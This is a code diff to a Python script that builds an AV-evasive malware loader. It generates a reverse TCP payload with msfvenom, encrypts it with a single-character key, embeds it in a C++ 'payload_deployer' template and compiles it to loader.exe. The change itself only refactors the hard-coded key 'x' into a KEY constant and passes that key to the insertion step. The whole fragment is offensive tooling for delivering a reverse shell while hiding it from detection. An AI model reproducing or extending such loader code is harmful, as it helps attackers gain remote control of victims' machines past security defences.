@@ -10,11 +10,14 @@ RAW_CODE_FILE = 'reverse_tcp_raw.txt'
 
 ENCRYPTED_CODE_FILE = 'reverse_tcp_enc.txt'
 
+KEY = 'x'
+
 LOADER_TEMPLATE = 'payload_deployer.cpp.template'
 
 GEN_CODE = 'payload_deployer_gen.cpp'
 
 LOADER_EXE = 'loader.exe'
+
 
 print('Creating payload using msfvenom...')
 
@@ -33,11 +36,11 @@ if payload_creator.wait() != 0:
 
 print('Encrypting payload...')
 
-encrypt(RAW_CODE_FILE, ENCRYPTED_CODE_FILE, 'x')
+encrypt(RAW_CODE_FILE, ENCRYPTED_CODE_FILE, KEY)
 
 print('Inserting payload into loader...')
 
-insert_payload(ENCRYPTED_CODE_FILE, LOADER_TEMPLATE, GEN_CODE)
+insert_payload(ENCRYPTED_CODE_FILE, KEY, LOADER_TEMPLATE, GEN_CODE)
 
 print('Compiling generated code...')
 
